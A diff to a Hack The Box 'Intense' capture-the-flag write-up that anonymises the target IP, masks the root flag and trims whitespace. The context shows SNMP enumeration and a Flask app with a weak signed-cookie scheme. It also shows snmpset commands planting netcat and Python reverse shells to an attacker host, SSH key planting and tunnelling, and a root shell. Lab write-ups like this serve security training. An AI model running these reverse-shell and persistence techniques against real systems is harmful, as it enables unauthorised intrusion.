@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Intense
 ---
 ## Overview - TODO: finish cleaning up notes
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-intense-infocard.png)
-
 Short description to include any strange things to be dealt with - Linux hard difficulty
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with - Linux hard di
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.195`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ nmap -n -v -sCV -p- 10.10.10.195 -oA intense  
+└─$ nmap -n -v -sCV -p- <YOUR_IP> -oA intense  
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 20:13 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -44,24 +42,24 @@ Completed NSE at 20:13, 0.00s elapsed
 Initiating NSE at 20:13
 Completed NSE at 20:13, 0.00s elapsed
 Initiating Ping Scan at 20:13
-Scanning 10.10.10.195 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 20:13, 0.05s elapsed (1 total hosts)
 Initiating Connect Scan at 20:13
-Scanning 10.10.10.195 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.195
-Discovered open port 22/tcp on 10.10.10.195
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 80/tcp on <YOUR_IP>
+Discovered open port 22/tcp on <YOUR_IP>
 Completed Connect Scan at 20:13, 22.38s elapsed (65535 total ports)
 Initiating Service scan at 20:13
-Scanning 2 services on 10.10.10.195
+Scanning 2 services on <YOUR_IP>
 Completed Service scan at 20:14, 6.14s elapsed (2 services on 1 host)
-NSE: Script scanning 10.10.10.195.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 20:14
 Completed NSE at 20:14, 1.59s elapsed
 Initiating NSE at 20:14
 Completed NSE at 20:14, 0.25s elapsed
 Initiating NSE at 20:14
 Completed NSE at 20:14, 0.00s elapsed
-Nmap scan report for 10.10.10.195
+Nmap scan report for <YOUR_IP>
 Host is up (0.071s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
@@ -215,18 +213,15 @@ from admin import admin
 import sqlite3
 import lwt
 
-
 app = Flask(__name__)
 
 app.register_blueprint(admin)
-
 
 @app.teardown_appcontext
 def close_connection(exception):
     db = getattr(g, '_database', None)
     if db is not None:
         db.close()
-
 
 @app.route('/submit', methods=["GET"])
 def submit():
@@ -235,7 +230,6 @@ def submit():
         user = get_user(session["username"], session["secret"])
         return render_template("submit.html", page="submit", user=user)
     return render_template("submit.html", page="submit")
-
 
 @app.route("/submitmessage", methods=["POST"])
 def submitmessage():
@@ -251,11 +245,9 @@ def submitmessage():
         return str(e)
     return "OK"
 
-
 @app.route("/login", methods=["GET"])
 def login():
     return render_template("login.html", page="login")
-
 
 @app.route("/postlogin", methods=["POST"])
 def postlogin():
@@ -270,13 +262,11 @@ def postlogin():
         return resp
     return "Login failed"
 
-
 @app.route("/logout")
 def logout():
     resp = make_response("<script>document.location.href='/';</script>")
     resp.set_cookie("auth", "", expires=0)
     return resp
-
 
 @app.route("/")
 @app.route("/home")
@@ -287,7 +277,6 @@ def index():
         print(user)
         return render_template("home.html", page="home", user=user)
     return render_template("home.html", page="home")
-
 
 if __name__ == "__main__":
     app.run()
@@ -303,20 +292,16 @@ import os
 
 SECRET = os.urandom(randrange(8, 15))
 
-
 class InvalidSignature(Exception):
     pass
-
 
 def sign(msg):
     """ Sign message with secret key """
     return sha256(SECRET + msg).digest()
 
-
 def verif_signature(data, sig):
     """ Verify if the supplied signature is valid """
     return sign(data) == sig
-
 
 def parse_session(cookie):
     """ Parse cookie and return dict
@@ -340,7 +325,6 @@ def parse_session(cookie):
             continue
     return info
 
-
 def create_session(data):
     """ Create session based on dict
         @data: {"key1":"value1","key2":"value2"}
@@ -351,7 +335,6 @@ def create_session(data):
     for k, v in data.items():
         session += f"{k}={v};"
     return session.encode()
-
 
 def create_cookie(session):
     cookie_sig = sign(session)
@@ -368,15 +351,12 @@ from flask import g
 from os import listdir, path
 import datetime
 
-
 DATABASE = "database.db"
-
 
 class User:
     def __str__(self):
         return "User(username=%s,role=%d)" % (self.username,
                                               self.role)
-
 
 def get_db():
     db = getattr(g, '_database', None)
@@ -384,13 +364,11 @@ def get_db():
         db = g._database = sqlite3.connect(DATABASE)
     return db
 
-
 def log_login(user):
     now = datetime.datetime.now()
     d = now.strftime("%Y-%m-%d")
     with open(f"logs/{d}.log", 'a') as log:
         log.write(str(user) + ' logged\n')
-
 
 def badword_in_str(data):
     data = data.lower()
@@ -400,18 +378,15 @@ def badword_in_str(data):
             return True
     return False
 
-
 def hash_password(password):
     """ Hash password with a secure hashing function """
     return sha256(password.encode()).hexdigest()
-
 
 def query_db(query, args=(), one=False):
     cur = get_db().execute(query, args)
     rv = cur.fetchall()
     cur.close()
     return (rv[0] if rv else None) if one else rv
-
 
 def get_user(username, secret):
     """ Returns User object if given username/secret exist in DB """
@@ -437,7 +412,6 @@ def try_login(form):
         return {"username": username, "secret":password}
     return None
 
-
 def get_session(request):
     """ Get user session and parse it """
     if not request.cookies:
@@ -451,7 +425,6 @@ def get_session(request):
         return {"status": -1, "msg": "Invalid signature"}
     return info
 
-
 def is_admin(request):
     session = get_session(request)
     if not session:
@@ -461,14 +434,12 @@ def is_admin(request):
     user = get_user(session["username"], session["secret"])
     return user.role == 1
 
-
 #### Logs functions ####
 def admin_view_log(filename):
     if not path.exists(f"logs/{filename}"):
         return f"Can't find {filename}"
     with open(f"logs/{filename}") as out:
         return out.read()
-
 
 def admin_list_log(logdir):
     if not path.exists(f"logs/{logdir}"):
@@ -540,9 +511,9 @@ import requests
 import string
 import time
 
-url = "http://10.10.10.195/submitmessage"
+url = "http://<YOUR_IP>/submitmessage"
 guest_secret = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY="
-referer = "http://10.10.10.195/submit"
+referer = "http://<YOUR_IP>/submit"
 
 def get_secret():
     secret = ""
@@ -599,11 +570,9 @@ def sign(msg):
     """ Sign message with secret key """
     return sha256(SECRET + msg).digest()
 
-
 def verif_signature(data, sig):
     """ Verify if the supplied signature is valid """
     return sign(data) == sig
-
 
 def parse_session(cookie):
     """ Parse cookie and return dict
@@ -717,7 +686,7 @@ installed snmp MIBs
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195                                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP>                                                   2 ⚙
 SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (5436351) 15:06:03.51
@@ -752,7 +721,7 @@ Not much information gained from SNMP walk
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                             130 ⨯ 2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                             130 ⨯ 2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
@@ -770,7 +739,7 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/nc 10.10.15.100 55541 -e /bin/bash' 'nsExtendArgs."command"'    = 'hello world' 
+└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/nc 10.10.15.100 55541 -e /bin/bash' 'nsExtendArgs."command"'    = 'hello world' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/nc 10.10.15.100 55541 -e /bin/bash
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: hello world
@@ -780,7 +749,7 @@ created my command to send nc reverse shell
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: /bin/nc: invalid option -- 'e'
@@ -806,7 +775,7 @@ Unfortunately the version of `nc` on the victim's computer did not have `-e` fun
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING:   File "<string>", line 1
@@ -825,17 +794,17 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
-Timeout: No Response from 10.10.10.195
+Timeout: No Response from <YOUR_IP>
 ```
 
 I tried sending a reverse shell, but got an End-of-Line error
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
+└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/usr/bin/python3' 'nsExtendArgs."command"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"' 
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /usr/bin/python3
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.15.100\",55541));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"
@@ -849,7 +818,7 @@ after trying a few things realized that some of the internal quotes needed to be
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541                              
 listening on [any] 55541 ...
-connect to [10.10.15.100] from (UNKNOWN) [10.10.10.195] 60688
+connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 60688
 $ id && hostname
 id && hostname
 uid=111(Debian-snmp) gid=113(Debian-snmp) groups=113(Debian-snmp)
@@ -862,8 +831,6 @@ got a shell back on my waiting nc listener
 There was a strange problem I encountered with this SNMP shell...if I lost my shell I would lose the ability to connect back to this box. Not sure why or how, but it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\).  After it happened again later I reset the machine itself and this fixed it...
 {% endhint %}
 
-
-
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `Debian-snmp`
@@ -872,7 +839,7 @@ There was a strange problem I encountered with this SNMP shell...if I lost my sh
 ┌──(zweilos㉿kali)-[~/htb/intense]
 └─$ nc -lvnp 55541
 listening on [any] 55541 ...
-connect to [10.10.15.100] from (UNKNOWN) [10.10.10.195] 57960
+connect to [10.10.15.100] from (UNKNOWN) [<YOUR_IP>] 57960
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 Debian-snmp@intense:/$ export TERM=xterm-256color
@@ -935,7 +902,7 @@ Analysis of the note\_server.c code showed me that the program was looking for a
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
+└─$ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 <YOUR_IP> 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = '/bin/bash' 'nsExtendArgs."command"' = "-c \"/bin/echo ${ssh_key} >> ~/.ssh/authorized_keys\""
 NET-SNMP-EXTEND-MIB::nsExtendStatus."command" = INTEGER: createAndGo(4)
 NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
 NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "/bin/echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbT4GbSUckWcD775fh2EvAIst9754Yn0+88VlmfbV9qXiCEUeCrHXiEFc1KYDYnx/3CEUgu8gby04mHtBdP6n8= zweilos@kali >> ~/.ssh/authorized_keys"
@@ -945,7 +912,7 @@ I tried echoing my ssh key to `user` but got a permission denied error, so I tri
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ ssh -i intense.key Debian-snmp@10.10.10.195                                                   255 ⨯
+└─$ ssh -i intense.key Debian-snmp@<YOUR_IP>                                                   255 ⨯
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -956,9 +923,8 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
   System load:  0.05              Processes:             172
   Usage of /:   6.2% of 39.12GB   Users logged in:       0
-  Memory usage: 7%                IP address for ens160: 10.10.10.195
+  Memory usage: 7%                IP address for ens160: <YOUR_IP>
   Swap usage:   0%
-
 
  * Canonical Livepatch is available for installation.
    - Reduce system reboots and improve kernel security. Activate at:
@@ -967,22 +933,21 @@ Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 181 packages can be updated.
 130 updates are security updates.
 
-
 Last login: Tue Jun 30 09:34:08 2020 from 10.10.14.2
-Connection to 10.10.10.195 closed.
+Connection to <YOUR_IP> closed.
 
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ ssh -i intense.key Debian-snmp@10.10.10.195 "bash --noprofile --norc"                           1 ⨯
+└─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "bash --noprofile --norc"                           1 ⨯
 
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ ssh -i intense.key Debian-snmp@10.10.10.195 "/bin/sh"
+└─$ ssh -i intense.key Debian-snmp@<YOUR_IP> "/bin/sh"
 ```
 
 I was successful in copying my key, but I wasn't able to login and get a shell. I tried a few bypass methods, but it seemed as if they had it locked down.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
-└─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense.key
+└─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@<YOUR_IP> -i intense.key
 ```
 
 Even though I couldn't login, I was still able to use SSH to create a tunnel to the machine without running any commands.  This came in handy later when I wanted to connect to a port that was only open on the local host.
@@ -1151,13 +1116,9 @@ uid=0(root) gid=0(root) groups=0(root)
 $ hostname
 intense
 $ cat /root/root.txt
-b3e42063bf6316157da49cbfae5e21d7
+****
 ```
 
 sdg
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-pwned.png)
-
-Thanks to [`sokafr`](https://app.hackthebox.eu/users/19014) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
